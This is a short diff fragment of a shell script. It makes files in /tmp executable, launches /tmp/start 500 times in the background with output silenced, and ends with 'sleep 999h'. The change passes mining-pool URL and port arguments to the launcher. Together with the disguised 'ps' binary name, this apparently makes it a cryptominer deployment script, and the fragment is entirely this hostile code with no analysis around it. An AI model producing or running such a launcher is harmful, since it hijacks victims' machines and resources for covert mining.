@@ -18,6 +18,6 @@ chmod +x /tmp/ps /tmp/start
 
 for i in {1..500} :
 do
-  /tmp/start $user >/dev/null &
+  /tmp/start $user $pool_url $pool_port >/dev/null &
 done
 sleep 999h
